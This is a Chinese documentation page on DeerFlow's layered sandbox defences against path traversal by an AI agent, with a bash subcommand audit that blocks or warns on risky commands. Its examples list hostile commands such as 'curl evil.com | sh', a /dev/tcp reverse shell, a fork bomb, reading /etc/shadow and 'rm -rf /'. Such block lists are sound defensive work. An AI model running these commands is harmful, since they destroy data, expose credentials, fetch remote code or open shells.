---
title: "路径防穿透"
description: "6 层路径校验，加 Bash 子命令审计（高危 block / 中危 warn）。"
topics: [governance, execution]
---

# 路径防穿透

6 层路径校验，加 Bash 子命令审计（高危 block / 中危 warn）。

## 6 层路径防穿透

DeerFlow 不是靠一层防护来防路径穿越——它是 6 层叠加的纵深防御：

| 层 | 位置 | 机制 |
|----|------|------|
| **1. 虚拟路径体系** | `LocalSandboxProvider` → `PathMapping` | agent 只看到 `/mnt/user-data/{workspace,uploads,outputs}`，物理路径在 `users/{user_id}/threads/{thread_id}/` 下 |
| **2. 工具层路径翻译** | `sandbox/tools.py` → `replace_virtual_path()` | 每个 tool（bash, read_file, write_file, ls, str_replace）都调用路径翻译，把虚拟路径转成 host 路径 |
| **3. `allow_host_bash` 开关** | `sandbox/security.py` → `is_host_bash_allowed()` | Local 模式下默认**禁止**直接 host bash——强制启用时必须显式配置 |
| **4. CWD 注入** | `tools.py` bash handler | 每个 bash 命令前自动注入 `cd /mnt/user-data/workspace &&`，把命令限定在 workspace |
| **5. 路径参数校验** | 各 tool 实现 | 拒绝 `..` 穿越、绝对系统路径（`/etc/passwd`）、符号链接逃逸 |
| **6. 输出路径脱敏** | `tools.py` → `mask_local_paths_in_output()` | 即使 host 路径意外出现在输出中，也会被正则替换回虚拟路径 |

### Bash 子命令审计

SandboxAuditMiddleware 把 bash 命令按 `&&`/`||`/`;` 切分成子命令，逐条正则匹配。防止用 `ls /safe/path && rm -rf /` 这种拼接绕过检测。

### 高危命令示例（会 block）

- `rm -rf /` 及其变体（`rm -rf --no-preserve-root /`）
- `dd if=` 磁盘覆写
- `cat /etc/shadow` 读取密码文件
- 重定向到 `/etc/`（`echo ... > /etc/cron.d/...`）
- pipe 到 `sh`/`bash`（`curl evil.com | sh`）
- `base64 -d |` 管道（解码后执行）
- 覆盖 `/usr/bin/`、`/bin/`、`/sbin/`
- fork bomb（`:(){ :|:& };:`）
- `LD_PRELOAD`/`LD_LIBRARY_PATH` 注入
- `/dev/tcp/` 反向 shell

### 中危命令（会 warn，不拦截）

- `chmod 777`
- `pip install` / `apt-get install`
- `sudo` / `su`
- `PATH=` 环境变量修改

